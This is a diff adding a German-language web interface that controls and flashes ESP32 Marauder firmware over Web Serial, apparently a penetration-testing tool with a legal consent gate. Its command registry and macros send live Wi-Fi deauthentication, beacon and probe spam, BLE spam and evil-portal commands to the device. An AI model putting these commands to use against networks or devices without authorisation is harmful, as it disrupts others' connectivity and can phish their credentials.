+        <input type="text" id="macroName" placeholder="Macro-Name" style="width:180px">
+        <button class="btn" id="macroSave">speichern/aktualisieren</button>
+      </div>
+      <div class="row">
+        <label>Preset einfügen</label>
+        <select id="macroPreset">
+          <option value="">—</option>
+          <option value="apscan">AP-Scan + Liste</option>
+          <option value="deauth">Deauth-Test (Ziel 0)</option>
+          <option value="blescan">BLE-Scan</option>
+          <option value="recon">Voll-Recon (AP+STA+BLE)</option>
+        </select>
+      </div>
+      <textarea id="macro" style="width:100%;height:200px;font-family:monospace;font-size:12px"
+        placeholder="scanap&#10;wait 8000&#10;stopscan&#10;list -a"></textarea>
+      <div class="row">
+        <label>Standard-Pause ms</label><input type="number" id="macroDelay" value="300" min="0">
+        <button class="btn primary" id="macroRun">▶ Ausführen</button>
+        <button class="btn stop" id="macroStop">■ Stop</button>
+      </div>
+    </section>
+
+    <!-- ===================== FLASH ===================== -->
+    <section class="view" data-view="flash">
+      <h2>⚡ Flash / Wartung</h2>
+      <p class="sub">Kompatibel mit allen ESP32-Varianten (ESP32, S2, S3, C3, C5, C6, H2). esptool-js erkennt den Chip automatisch.</p>
+      <div class="row">
+        <span class="badge" id="flashChip">Chip: — (erst verbinden)</span>
+        <label>Flash-Baud</label>
+        <select id="flashBaud"><option>115200</option><option selected>460800</option><option>921600</option></select>
+        <span id="flashLib" class="hint">Lib: —</span>
+        <label><input type="checkbox" id="fwProxy"> CORS-Proxy (falls Download blockiert)</label>
+      </div>
+
+      <!-- A: eingebautes S3-Voll-Image -->
+      <div class="okbox">
+        <div class="step" style="margin-top:0">A · ESP32-S3 Voll-Reparatur (eingebautes Komplett-Image)</div>
+        <div class="hint">Nur für <b>ESP32-S3</b>. Enthält Bootloader+Partitionen+App — repariert auch komplett leere/gebrickte S3.</div>
+        <button class="go" id="autoRepair" style="width:100%;padding:13px;font-size:14px">🚀 ESP32-S3 reparieren — 1 Klick</button>
+        <div class="progwrap"><div class="progbar" id="prog"></div></div>
+        <div class="hint" id="autoStatus">Eingebaut: <b id="embName">—</b> — komplettes Image @0x0.</div>
+      </div>
+
+      <!-- B: universal app flash -->
+      <div class="panelbox">
+        <div class="step" style="margin-top:0">B · Universal — Marauder-App flashen (jeder Chip)</div>
+        <div class="hint">Für jeden ESP32, der schon einen Bootloader hat (Normalfall). Lädt die App deines Boards von GitHub und schreibt sie <b>@0x10000</b> — Bootloader/Partitionen bleiben erhalten. Chip wird beim Flashen erkannt.</div>
+        <div class="row">
+          <button class="btn" id="fwList" style="flex:1">↻ Marauder-Builds laden</button>
+          <input type="text" id="fwSearch" placeholder="Board filtern: s3, cyd, flipper, c6, mini …" style="flex:1">
+        </div>
+        <select id="fwSelect" style="width:100%"><option>— erst Liste laden —</option></select>
+        <div class="hint" id="fwHint">Tipp: dein DevKitC-1 = <code>multiboardS3</code>. Andere: Boardname im Filter suchen.</div>
+        <div class="row">
+          <button class="go" id="appFlash" style="flex:1" disabled>⚡ App flashen (@0x10000)</button>
+          <button class="warnb" id="repairUni" style="flex:1" disabled>🛠 Voll-Reparatur (Bootloader+App)</button>
+        </div>
+        <div id="fwStatus" class="hint"><b>App flashen</b> = Update, Board hat schon Bootloader. <b>Voll-Reparatur</b> = auch Bootloader+Partitionen neu (für leere/gebrickte Boards, jeder Chip: ESP32/S2/S3/C3). Bei „Failed to fetch": CORS-Proxy oben anhaken.</div>
+      </div>
+
+      <!-- C: manual -->
+      <div class="panelbox">
+        <h3 style="margin-top:0">C · Manuell / Erweitert (Voll-Flash, eigene Dateien)</h3>
+        <div class="row">
+          <label>Chip</label>
+          <select id="boardPreset">
+            <option value="auto">Auto (beim Verbinden erkannt)</option>
+            <option value="esp32">ESP32 classic — Bootloader @0x1000</option>
+            <option value="esp32s2">ESP32-S2 — Bootloader @0x1000</option>
+            <option value="esp32s3">ESP32-S3 — Bootloader @0x0</option>
+            <option value="esp32c3">ESP32-C3 — Bootloader @0x0</option>
+            <option value="esp32c5">ESP32-C5 — Bootloader @0x0</option>
+            <option value="esp32c6">ESP32-C6 — Bootloader @0x0</option>
+            <option value="esp32h2">ESP32-H2 — Bootloader @0x0</option>
+            <option value="app">Nur App @0x10000</option>
+            <option value="merged">Merged-Bin @0x0</option>
+          </select>
+        </div>
+        <div class="hint" id="boardNote">Auto: Offsets werden nach erkanntem Chip gesetzt. Classic/S2 haben Bootloader @0x1000, alle neueren @0x0.</div>
+
+        <div class="step">1. Verbinden (ROM/Download-Modus)</div>
+        <button class="warnb" id="flashConnect" style="width:100%">Chip verbinden &amp; erkennen</button>
+        <div class="hint">Fehler? BOOT halten → EN/RST tippen → BOOT los → Button.</div>
+
+        <div class="step">2. Flash löschen (optional)</div>
+        <button class="danger" id="eraseFlash" style="width:100%" disabled>Erase Flash (alles!)</button>
+
+        <div class="step">3. Dateien wählen</div>
+        <div class="hint" id="addrNote">Voll-Flash: bootloader @0x0 (classic @0x1000), partitions @0x8000, app @0x10000. Nur-App: eine Datei @0x10000.</div>
+        <div class="fileline"><input type="file" id="f0" accept=".bin"><input type="text" id="a0" value="0x0"></div>
+        <div class="fileline"><input type="file" id="f1" accept=".bin"><input type="text" id="a1" value="0x8000"></div>
+        <div class="fileline"><input type="file" id="f2" accept=".bin"><input type="text" id="a2" value="0x10000"></div>
+
+        <div class="step">4. Flashen</div>
+        <button class="go" id="doFlash" style="width:100%" disabled>▶ Firmware schreiben</button>
+        <button class="warnb" id="flashReset" style="width:100%;margin-top:6px" disabled>Reset &amp; Starten</button>
+
+        <div class="step">Recovery (im Terminal-Modus)</div>
+        <div class="row">
+          <button class="warnb" id="hwReset" style="flex:1">EN-Reset pulsen</button>
+          <button class="warnb" id="bootMode" style="flex:1">→ Bootloader</button>
+        </div>
+        <div class="hint">Voll-Flash für Nicht-S3 (Bootloader fehlt/leer) am sichersten via <a href="https://flasher.marauder.gg" target="_blank">flasher.marauder.gg</a> — hat komplette Manifeste pro Board.</div>
+      </div>
+    </section>
+  </div>
+</div>
+
+<!-- Console drawer -->
+<div class="console" id="console">
+  <div class="console-head" id="consoleHead">
+    <span class="title">🖥 Konsole</span>
+    <span class="tcount" id="consoleHint">— klicken zum Ein-/Ausklappen</span>
+    <div class="spacer"></div>
+    <input type="text" id="search" placeholder="🔎 filtern..." onclick="event.stopPropagation()">
+    <label onclick="event.stopPropagation()"><input type="checkbox" id="rxOnly"> nur RX</label>
+    <button id="clear" onclick="event.stopPropagation()">Leeren</button>
+    <button id="save" onclick="event.stopPropagation()">Log</button>
+  </div>
+  <div id="log"></div>
+  <div class="console-tools">
+    <div class="grp"><label>EOL</label><select id="eol"><option value="">–</option><option value="\n">LF</option>
+      <option value="\r" selected>CR</option><option value="\r\n">CRLF</option></select></div>
+    <div class="grp"><input type="checkbox" id="hexView"><label for="hexView">Hex RX</label></div>
+    <div class="grp"><input type="checkbox" id="filterNP" checked><label for="filterNP">NP filtern</label></div>
+    <div class="grp"><input type="checkbox" id="autoscroll" checked><label for="autoscroll">Autoscroll</label></div>
+    <div class="grp"><input type="checkbox" id="showTs"><label for="showTs">Zeit</label></div>
+    <div class="grp"><input type="checkbox" id="echoTx" checked><label for="echoTx">TX zeigen</label></div>
+    <div class="grp"><label>Max</label><input type="number" id="maxLines" value="3000" min="100" style="width:70px"></div>
+  </div>
+  <div class="sendbar">
+    <input type="text" id="input" placeholder="Befehl + Enter  (↑/↓ History, Strg+K Palette)" disabled autocomplete="off">
+    <div class="grp"><input type="checkbox" id="hexSend"><label for="hexSend">Hex</label></div>
+    <button id="send" disabled>Senden</button>
+  </div>
+</div>
+
+<!-- Consent / Legal gate -->
+<div class="modal" id="consent">
+  <div class="palette" style="padding:22px;max-width:580px;margin-top:70px">
+    <h2 style="margin:0 0 8px">⚠ Nur für autorisierte Tests</h2>
+    <p class="hint" style="font-size:12.5px">Dieses Tool steuert und flasht ESP32-<b>Marauder</b>-Firmware. Funktionen wie Deauth, Beacon-/Probe-Spam, Evil Portal und BLE-Spam senden aktiv Funk und stören fremde Geräte. Der Einsatz gegen fremde Netze, Geräte oder Personen <b>ohne ausdrückliche schriftliche Genehmigung ist strafbar</b> (u. a. § 202a/b/c, § 303a/b StGB, TKG).</p>
+    <p class="hint" style="font-size:12.5px">Mit <b>Bestätigen</b> erklärst du: Nutzung ausschließlich an eigener Hardware oder mit schriftlicher Erlaubnis, auf eigene Verantwortung, ohne Gewähr und Haftung.</p>
+    <div class="row"><a href="DISCLAIMER.md" target="_blank">Vollständiger Disclaimer</a><div class="spacer"></div>
+      <button class="btn" id="consentNo">Ablehnen</button>
+      <button class="btn go" id="consentOk">Bestätigen — nur autorisierte Tests</button></div>
+  </div>
+</div>
+
+<!-- Command palette -->
+<div class="modal" id="modal">
+  <div class="palette">
+    <input type="text" id="palInput" placeholder="Befehl suchen... Enter zum Senden">
+    <div class="list" id="palList"></div>
+  </div>
+</div>
+
+<script src="firmware-embed.js"></script>
+<script src="parts-embed.js"></script>
+<script type="module">
+"use strict";
+const $=id=>document.getElementById(id);
+const logEl=$("log");
+let port=null,reader=null,writer=null,keepReading=false;
+let rxBytes=0,txBytes=0,macroAbort=false;
+const history=[];let histIdx=-1;
+let romHits=0,lastRomTs=0;
+// esptool
+let ESPLoader=null,Transport=null,esptoolReady=false,flashTransport=null,esploader=null;
+let autoFwData=null,autoFwName="";
+// parsing
+let apList=[],staList=[],bleList=[];
+let listMode=null,listModeUntil=0;
+
+/* ---------- Command registry ---------- */
+const CMDS=[
+  ["System","help"],["System","reboot"],["System","settings"],["System","channel"],["System","stopscan"],
+  ["System","update -w"],["System","clearlist -a"],["System","clearlist -s"],["System","clearlist -c"],
+  ["WiFi","scanap"],["WiFi","scansta"],["WiFi","list -a"],["WiFi","list -s"],["WiFi","list -c"],
+  ["WiFi","sniffbeacon"],["WiFi","sniffprobe"],["WiFi","sniffdeauth"],["WiFi","sniffpwn"],["WiFi","sniffesp"],["WiFi","sniffraw"],
+  ["Attack","attack -t deauth"],["Attack","attack -t deauth -c"],["Attack","attack -t beacon -r"],
+  ["Attack","attack -t beacon -l"],["Attack","attack -t beacon -a"],["Attack","attack -t probe"],["Attack","attack -t rickroll"],
+  ["BLE","blescan -t all"],["BLE","sniffbt"],["BLE","sniffskim"],["BLE","blespam -t apple"],["BLE","blespam -t samsung"],
+  ["BLE","blespam -t google"],["BLE","blespam -t microsoft"],["BLE","blespam -t all"],["BLE","spoofle"],
+  ["Portal","evilportal -c start"],["Portal","evilportal -c stop"],
+  ["GPS","gps"],["GPS","gpsdata"],["GPS","wardrive"],["GPS","wardrivestation"],
+];
+
+/* ---------- Prefs ---------- */
+const PKEYS=["baud","eol","hexView","filterNP","autoscroll","showTs","echoTx","maxLines","macroDelay","flashBaud"];
+function loadPrefs(){try{const p=JSON.parse(localStorage.getItem("mccPrefs")||"{}");
+  PKEYS.forEach(k=>{if(p[k]===undefined)return;const el=$(k);if(!el)return;el.type==="checkbox"?el.checked=p[k]:el.value=p[k];});}catch(e){}}
+function savePrefs(){const p={};PKEYS.forEach(k=>{const el=$(k);if(el)p[k]=el.type==="checkbox"?el.checked:el.value;});localStorage.setItem("mccPrefs",JSON.stringify(p));}
+loadPrefs();PKEYS.forEach(k=>{const el=$(k);if(el)el.addEventListener("change",savePrefs);});
+
+/* ---------- Nav ---------- */
+function showView(v){
+  document.querySelectorAll(".nav-item").forEach(x=>x.classList.toggle("active",x.dataset.view===v));
+  document.querySelectorAll(".view").forEach(x=>x.classList.toggle("active",x.dataset.view===v));
+  try{localStorage.setItem("mccView",v);}catch(e){}
+}
+document.querySelectorAll(".nav-item").forEach(n=>n.onclick=()=>showView(n.dataset.view));
+
+/* ---------- Console log ---------- */
+function pad(n){return n<10?"0"+n:n;}
+function nowStr(){const d=new Date();return pad(d.getHours())+":"+pad(d.getMinutes())+":"+pad(d.getSeconds())+"."+String(d.getMilliseconds()).padStart(3,"0");}
+function applyFilter(div){const q=$("search").value.toLowerCase(),rxOnly=$("rxOnly").checked;let s=true;
+  if(rxOnly&&!div.classList.contains("line-rx"))s=false;
+  if(s&&q&&!div.textContent.toLowerCase().includes(q))s=false;div.classList.toggle("hidden",!s);}
+function trimLines(){const m=parseInt($("maxLines").value,10)||3000;while(logEl.childElementCount>m)logEl.removeChild(logEl.firstChild);}
+function append(text,cls){const div=document.createElement("div");div.className=cls;
+  if($("showTs").checked){const t=document.createElement("span");t.className="ts";t.textContent="["+nowStr()+"] ";div.appendChild(t);}
+  div.appendChild(document.createTextNode(text));logEl.appendChild(div);applyFilter(div);trimLines();
+  if($("autoscroll").checked)logEl.scrollTop=logEl.scrollHeight;
+  maybeSaveLog();}
+function toHex(b){return Array.from(b).map(x=>x.toString(16).padStart(2,"0")).join(" ");}
+function updCounters(){$("rxc").textContent=rxBytes;$("txc").textContent=txBytes;}
+
+/* ---------- Badges / dashboard ---------- */
+function setBadge(which,val){
+  if(which==="chip"){$("bChip").innerHTML="Chip: <b>"+val+"</b>";$("dChip").textContent=val;}
+  if(which==="fw"){$("bFw").innerHTML="FW: <b>"+val+"</b>";$("dFw").textContent=val;}
+  if(which==="ch"){$("bCh").innerHTML="Kanal: <b>"+val+"</b>";$("dCh").textContent=val;}
+}
+function setMode(m){
+  const b=$("bMode");b.className="badge"+(m==="Scan"?" mode-scan":m==="Attack"?" mode-attack":"");
+  b.innerHTML="Modus: <b>"+m+"</b>";$("dMode").textContent=m;$("aMode").textContent=m;
+}
+function setConnected(on){
+  $("dot").classList.toggle("on",on);
+  $("statusText").textContent=on?"Verbunden":"Getrennt";$("dConn").textContent=on?"Verbunden":"Getrennt";
+  $("connect").disabled=on;$("disconnect").disabled=!on;$("input").disabled=!on;$("send").disabled=!on;$("baud").disabled=on;
+}
+function updDashCounts(){$("dCounts").textContent=apList.length+" / "+staList.length;}
+
+/* ---------- Line analysis (badges + tables) ---------- */
+const MAC_RE=/([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})/;
+function parseEntry(line){
+  const mm=line.match(MAC_RE);if(!mm)return null;const mac=mm[1];
+  let idx=null;const im=line.match(/^\s*\[?(\d+)\]?\s*[:\)\]]/)||line.match(/^\s*(\d+)[\s:]/);if(im)idx=parseInt(im[1],10);
+  if(idx===null)return null;
+  let rssi=null;const rm=line.match(/(-\d{2,3})\b/);if(rm)rssi=parseInt(rm[1],10);
+  let ch=null;const cm=line.match(/ch(?:annel)?[:\s]*?(\d{1,2})\b/i);if(cm)ch=parseInt(cm[1],10);
+  let name=line.slice(line.indexOf(mac)+mac.length).replace(/^[\s\]\-|]+/,"").trim();
+  return {index:idx,rssi,ch,mac,name};
+}
+function upsert(arr,e){const i=arr.findIndex(x=>x.index===e.index&&x.mac===e.mac);if(i>=0)arr[i]=e;else arr.push(e);arr.sort((a,b)=>a.index-b.index);}
+function analyze(line){
+  let m;
+  if(m=line.match(/Marauder\s+v?\.?\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i))setBadge("fw","v"+m[1]);
+  if(/esp32-?s3/i.test(line))setBadge("chip","ESP32-S3");
+  else if(/esp32-?s2/i.test(line))setBadge("chip","ESP32-S2");
+  else if(/esp32-?c3/i.test(line))setBadge("chip","ESP32-C3");
+  if(m=line.match(/(?:current\s+)?channel[:\s]*([0-9]{1,2})\b/i))setBadge("ch",m[1]);
+  // Settings-Ausgabe -> Live-Tabelle
+  if(parseSetting(line))return;
+  // GPS-Ausgabe -> Panel (waehrend Capture-Fenster alles sammeln)
+  if(performance.now()<captureGpsUntil&&line.trim()&&!/^\s*>/.test(line)){
+    const g=$("gpsOut");g.textContent=(g.textContent.startsWith("—")?"":g.textContent)+line+"\n";return;}
+  // BLE: Format "Device: <Name-oder-MAC>-<RSSI>" (kein Index, oft ohne Zeilenumbruch)
+  if(/^Device:/.test(line)){
+    const m=line.match(/^Device:\s*(.*?)-(\d{1,3})\s*$/);
+    if(m){const tok=(m[1]||"").trim();const rssi=-parseInt(m[2],10);
+      if(tok){const isMac=/^([0-9a-f]{2}:){5}[0-9a-f]{2}$/i.test(tok);
+        upsertBle(isMac?"":tok,isMac?tok:"",rssi);renderBle();}}
+    return;
+  }
+  // Universeller Parser: JEDE Zeile mit MAC -> passende Tabelle
+  if(/^\s*(MAC:|Saved PC|load:|entry |mode:|rst:)/i.test(line))return; // Boot/ROM-Rauschen ignorieren
+  const macm=line.match(/([0-9a-f]{2}(?::[0-9a-f]{2}){5})/i);
+  if(macm){
+    const mac=macm[1].toLowerCase();
+    let rssi=null;const rm=line.match(/rssi[:\s]*(-?\d{1,3})/i)||line.match(/(-\d{2,3})(?!\d)/);
+    if(rm)rssi=-Math.abs(parseInt(rm[1],10));
+    let ch=null;const cm=line.match(/\bch(?:annel)?[:\s]*?(\d{1,3})\b/i);if(cm)ch=+cm[1];
+    let name="";const nm=line.match(/(?:ESSID|SSID|Requesting|Name)[:\s]+(.+?)\s*$/i);
+    if(nm)name=nm[1].trim();
+    const isSta=/client|requesting|station/i.test(line);
+    const isAp=/bssid|essid|beacon|access\s*point|\bap[:\s]/i.test(line);
+    let tgt;
+    if(isSta&&!isAp)tgt="sta";else if(isAp)tgt="ap";
+    else tgt=(listMode==="sta"?"sta":listMode==="ble"?"ble":"ap");
+    if(tgt==="sta"){upsertMac(staList,{rssi,ch,mac,name});renderSta();}
+    else if(tgt==="ap"){upsertMac(apList,{rssi,ch,mac,name});renderAp();}
+    else if(tgt==="ble"){upsertMac(bleList,{rssi,mac,name});renderBle();}
+    maybeSaveState();return;
+  }
+  // list -a mit Index aber ohne MAC (SSID-only Zeilen) -> Fallback
+  const parse=(listMode==="ap"||listMode==="sta")&&performance.now()<listModeUntil;
+  if(parse){const e=parseEntry(line);if(e){
+    if(listMode==="ap"){upsert(apList,e);renderAp();maybeSaveState();}
+    else if(listMode==="sta"){upsert(staList,e);renderSta();maybeSaveState();}
+  }}
+}
+function upsertMac(arr,e){const i=arr.findIndex(x=>x.mac&&x.mac.toLowerCase()===e.mac.toLowerCase());
+  if(i>=0){const idx=arr[i].index;Object.assign(arr[i],e);arr[i].index=idx;}
+  else{e.index=arr.length;arr.push(e);if(arr.length>400)arr.shift();}}
+let stSaveT=0;function maybeSaveState(){const t=performance.now();if(t-stSaveT>2000){stSaveT=t;saveState();}}
+let bleSaveT=0;
+function upsertBle(name,mac,rssi){
+  const key=mac||name;if(!key)return;
+  const i=bleList.findIndex(x=>(x.mac||x.name)===key);
+  if(i>=0){bleList[i].rssi=rssi;}
+  else{bleList.push({index:bleList.length,rssi,mac,name});if(bleList.length>600)bleList.shift();}
+  const t=performance.now();if(t-bleSaveT>2000){bleSaveT=t;saveState();}
+}
+
+/* ---------- Persistenz (Tabellen + Log ueberleben Reload) ---------- */
+function saveState(){try{localStorage.setItem("mccTables",JSON.stringify({ap:apList,sta:staList,ble:bleList}));}catch(e){}}
+function saveLog(){try{const items=[...logEl.children].slice(-400).map(d=>({t:d.textContent,c:d.className}));
+  localStorage.setItem("mccLog",JSON.stringify(items));}catch(e){}}
+let logSaveT=0;
+function maybeSaveLog(){const t=performance.now();if(t-logSaveT>3000){logSaveT=t;saveLog();}}
+function restoreState(){try{
+  const tb=JSON.parse(localStorage.getItem("mccTables")||"{}");
+  if(Array.isArray(tb.ap)){apList=tb.ap;renderAp();}
+  if(Array.isArray(tb.sta)){staList=tb.sta;renderSta();}
+  if(Array.isArray(tb.ble)){bleList=tb.ble;renderBle();}
+  const lg=JSON.parse(localStorage.getItem("mccLog")||"[]");
+  lg.forEach(it=>{const d=document.createElement("div");d.className=it.c||"line-rx";d.textContent=it.t;logEl.appendChild(d);});
+  if(lg.length){logEl.scrollTop=logEl.scrollHeight;append("— vorherige Sitzung wiederhergestellt (Reload) —","line-sys");}
+  const v=localStorage.getItem("mccView");if(v)showView(v);
+}catch(e){}}
+
+/* ---------- Table rendering ---------- */
+function selBtn(cmd){const b=document.createElement("button");b.className="btn";b.style.padding="3px 8px";b.textContent="select";b.onclick=()=>fire(cmd);return b;}
+function cbCell(kind,idx){const td=document.createElement("td");const c=document.createElement("input");c.type="checkbox";c.dataset.kind=kind;c.dataset.i=idx;c.onchange=updMarks;td.appendChild(c);return td;}
+function cell(v,cls){const td=document.createElement("td");if(cls)td.className=cls;td.textContent=(v??"")+"";return td;}
+function renderAp(){const tb=$("apRows");tb.innerHTML="";apList.forEach(e=>{const tr=document.createElement("tr");
+  tr.appendChild(cbCell("ap",e.index));[e.index,e.rssi,e.ch].forEach(v=>tr.appendChild(cell(v)));
+  tr.appendChild(cell(e.mac,"mac"));tr.appendChild(cell(e.name));const td=document.createElement("td");td.appendChild(selBtn("select -a "+e.index));tr.appendChild(td);tb.appendChild(tr);});
+  $("apCount").textContent=apList.length;updDashCounts();}
+function renderSta(){const tb=$("staRows");tb.innerHTML="";staList.forEach(e=>{const tr=document.createElement("tr");
+  tr.appendChild(cbCell("sta",e.index));[e.index,e.rssi,e.ch].forEach(v=>tr.appendChild(cell(v)));
+  tr.appendChild(cell(e.mac,"mac"));tr.appendChild(cell(e.name));const td=document.createElement("td");td.appendChild(selBtn("select -c "+e.index));tr.appendChild(td);tb.appendChild(tr);});
+  $("staCount").textContent=staList.length;updDashCounts();}
+function renderBle(){const tb=$("bleRows");tb.innerHTML="";bleList.forEach(e=>{const tr=document.createElement("tr");
+  [e.index,e.rssi].forEach(v=>tr.appendChild(cell(v)));tr.appendChild(cell(e.mac,"mac"));tr.appendChild(cell(e.name));tb.appendChild(tr);});
+  $("bleCount").textContent=bleList.length;}
+function updMarks(){const ap=document.querySelectorAll('#apRows input[type=checkbox]:checked').length;
+  const sta=document.querySelectorAll('#staRows input[type=checkbox]:checked').length;
+  $("aMarkAp").textContent=ap;$("aMarkSta").textContent=sta;}
+
+/* ---------- Serial ---------- */
+async function connect(){
+  try{port=await navigator.serial.requestPort();const baud=parseInt($("baud").value,10);
+    await port.open({baudRate:baud});
+    try{await port.setSignals({dataTerminalReady:false,requestToSend:false});}catch(e){}
+    writer=port.writable.getWriter();setConnected(true);
+    const info=port.getInfo();
+    append(`Verbunden @ ${baud} Baud`+(info.usbVendorId?` (VID:${info.usbVendorId.toString(16)} PID:${info.usbProductId.toString(16)})`:""),"line-sys");
+    keepReading=true;readLoop();
+  }catch(e){if(e.name!=="NotFoundError")append("Verbinden fehlgeschlagen: "+e.message,"line-err");}
+}
+function cleanPrintable(s){return s.replace(/[^\x09\x0a\x0d\x20-\x7e -￿]/g,"");}
+function detectLoop(line){if(/ESP-ROM:esp32|RTCWDT_RTC_RST|rst:0x/.test(line)){const t=performance.now();
+  if(t-lastRomTs<3000)romHits++;else romHits=1;lastRomTs=t;if(romHits>=3)$("dashLoop").style.display="block";}}
+async function readLoop(){const dec=new TextDecoder();let buf="";
+  while(port&&port.readable&&keepReading){reader=port.readable.getReader();
+    try{while(true){const{value,done}=await reader.read();if(done)break;if(!value)continue;
+      rxBytes+=value.length;updCounters();
+      if($("hexView").checked){append(toHex(value),"line-rx");}
+      else{let chunk=dec.decode(value,{stream:true});
+        // Marauder crammt BLE/Scan-Ausgabe ohne Zeilenumbrueche -> vor Markern umbrechen
+        chunk=chunk.replace(/\s*Device:\s*/g,"\nDevice: ").replace(/\s*RSSI:/g,"\nRSSI:");
+        buf+=chunk;let i;
+        while((i=buf.search(/\r\n|\n|\r/))>=0){let line=buf.slice(0,i);detectLoop(line);
+          if($("filterNP").checked)line=cleanPrintable(line);
+          if(line.trim()!==""){append(line,"line-rx");analyze(line);}
+          buf=buf.slice(i+(buf.substr(i,2)==="\r\n"?2:1));}}
+    }}catch(e){append("Lesefehler: "+e.message,"line-err");}finally{reader.releaseLock();}}}
+async function disconnect(){keepReading=false;macroAbort=true;
+  try{if(reader)await reader.cancel();}catch(e){}
+  try{if(writer){writer.releaseLock();writer=null;}}catch(e){}
+  try{if(port){await port.close();port=null;}}catch(e){}
+  setConnected(false);append("Getrennt","line-sys");}
+function parseHexInput(s){const c=s.replace(/0x/gi,"").replace(/[^0-9a-fA-F]/g,"");
+  if(c.length%2)throw new Error("Hex braucht gerade Nibble-Anzahl");const a=new Uint8Array(c.length/2);
+  for(let i=0;i<a.length;i++)a[i]=parseInt(c.substr(i*2,2),16);return a;}
+function noteMode(raw){
+  // -a=APs, -c=Stationen/Clients, -s=SSIDs (Marauder-Flag-Konvention)
+  if(/^(list -a|scanap)/.test(raw)){listMode="ap";listModeUntil=performance.now()+12000;setMode("Scan");}
+  else if(/^(list -c|scansta)/.test(raw)){listMode="sta";listModeUntil=performance.now()+12000;setMode("Scan");}
+  else if(/^list -s/.test(raw)){listMode=null;} // SSID-Namen -> keine Tabelle
+  else if(/^(blescan|sniffbt|sniffskim)/.test(raw)){listMode="ble";listModeUntil=performance.now()+12000;setMode("Scan");}
+  else if(/^sniffbeacon/.test(raw)){listMode="ap";listModeUntil=performance.now()+12000;setMode("Scan");}
+  else if(/^(sniffprobe|sniffdeauth|sniffpwn)/.test(raw)){listMode="sta";listModeUntil=performance.now()+12000;setMode("Scan");}
+  else if(/^sniff/.test(raw))setMode("Scan");
+  else if(/^attack|blespam|spoofle/.test(raw))setMode("Attack");
+  else if(/^stopscan/.test(raw))setMode("Idle");
+  if(/^settings\s*$/.test(raw)){captureSetUntil=performance.now()+6000;$("setInfo").textContent="lese Einstellungen ...";}
+  if(/^(gps|gpsdata)\b/.test(raw)){captureGpsUntil=performance.now()+6000;$("gpsOut").textContent="";}
+  if($("liveParse")&&$("liveParse").checked&&listMode)listModeUntil=performance.now()+12000;
+}
+async function sendText(raw){if(!writer||raw==="")return;
+  const map={"\\n":"\n","\\r":"\r","\\r\\n":"\r\n","":""};const eol=map[$("eol").value]??$("eol").value;
+  const data=new TextEncoder().encode(raw+eol);
+  if($("echoTx").checked)append("» "+raw,"line-tx");
+  await writer.write(data);txBytes+=data.length;updCounters();
+  history.push(raw);histIdx=history.length;noteMode(raw);}
+async function send(){if(!writer)return;const raw=$("input").value;if(raw==="")return;
+  try{if($("hexSend").checked){const d=parseHexInput(raw);if($("echoTx").checked)append("» "+toHex(d),"line-tx");
+      await writer.write(d);txBytes+=d.length;updCounters();history.push(raw);histIdx=history.length;}
+    else await sendText(raw);$("input").value="";}catch(e){append("Sendefehler: "+e.message,"line-err");}}
+async function fire(cmd){if(!writer){append("Nicht verbunden (oder Board im Boot-Loop → Flash-Tab).","line-err");return;}
+  try{await sendText(cmd);}catch(e){append("Sendefehler: "+e.message,"line-err");}}
+window._fire=fire;
+
+/* Smart-Scan: Tool hüpft selbst durch alle Kanäle, sammelt Beacons -> AP-Tabelle */
+let smartRunning=false,smartAbort=false;
+async function smartScan(){
+  if(!writer){append("Nicht verbunden.","line-err");return;}
+  if(smartRunning){smartAbort=true;return;}
+  smartRunning=true;smartAbort=false;$("smartScan").textContent="■ Smart-Scan stoppen";
+  append("Smart-Scan: Kanäle 1-13 werden abgesucht (sniffbeacon)...","line-sys");
+  try{
+    for(let ch=1;ch<=13;ch++){
+      if(smartAbort)break;
+      $("smartScan").textContent="■ Smart-Scan… Kanal "+ch+"/13";
+      await sendText("stopscan");await new Promise(r=>setTimeout(r,120));
+      await sendText("channel -s "+ch);await new Promise(r=>setTimeout(r,150));
+      await sendText("sniffbeacon");
+      await new Promise(r=>setTimeout(r,1700));
+    }
+    await sendText("stopscan");
+    append("Smart-Scan fertig. "+apList.length+" APs in Tabelle.","line-sys");
+  }catch(e){append("Smart-Scan-Fehler: "+e.message,"line-err");}
+  finally{smartRunning=false;smartAbort=false;$("smartScan").textContent="🔎 Smart-Scan (alle Kanäle)";}
+}
+
+/* ---------- Recovery signals ---------- */
+async function hwReset(){if(!port){append("Erst verbinden.","line-err");return;}try{append("EN-Reset pulsen...","line-sys");
+  await port.setSignals({requestToSend:true,dataTerminalReady:false});await new Promise(r=>setTimeout(r,120));
+  await port.setSignals({requestToSend:false,dataTerminalReady:false});append("Reset gesendet.","line-sys");}catch(e){append("Reset-Fehler: "+e.message,"line-err");}}
+async function bootMode(){if(!port){append("Erst verbinden.","line-err");return;}try{append("Bootloader-Sequenz...","line-sys");
+  await port.setSignals({dataTerminalReady:true,requestToSend:true});await new Promise(r=>setTimeout(r,120));
+  await port.setSignals({dataTerminalReady:true,requestToSend:false});await new Promise(r=>setTimeout(r,120));
+  await port.setSignals({dataTerminalReady:false,requestToSend:false});append("Download-Modus (zum Flashen).","line-sys");}catch(e){append("Fehler: "+e.message,"line-err");}}
+
+/* ---------- Flasher (esptool-js) ---------- */
+const flog=m=>append("[flash] "+m,"line-flash");
+const ESPTOOL_URLS=["https://unpkg.com/esptool-js@0.5.4/bundle.js","https://cdn.jsdelivr.net/npm/esptool-js@0.5.4/bundle.js"];
+async function loadEsptool(){if(esptoolReady)return true;
+  for(const url of ESPTOOL_URLS){try{flog("lade esptool-js ...");const mod=await import(url);
+    ESPLoader=mod.ESPLoader;Transport=mod.Transport;
+    if(ESPLoader&&Transport){esptoolReady=true;$("flashLib").textContent="Lib: geladen ✓";flog("esptool-js bereit.");return true;}}
+    catch(e){flog("Fehlgeschlagen: "+e.message);}}
+  $("flashLib").textContent="Lib: FEHLER";flog("esptool-js nicht ladbar → flasher.marauder.gg.");return false;}
+let espWriteBuf="";
+function espProg(str){const m=(""+str).match(/\((\d+)\s*%\)/);if(m){$("prog").style.width=m[1]+"%";$("autoStatus").textContent="flashe... "+m[1]+"%";}}
+const espTerminal={clean(){},
+  writeLine(d){if(espWriteBuf){append("[flash] "+espWriteBuf,"line-flash");espWriteBuf="";}append("[flash] "+d,"line-flash");espProg(d);},
+  write(d){espWriteBuf+=(""+d);let i;while((i=espWriteBuf.search(/[\r\n]/))>=0){const l=espWriteBuf.slice(0,i);espWriteBuf=espWriteBuf.slice(i+1);if(l.trim())append("[flash] "+l,"line-flash");}espProg(d);}};
+
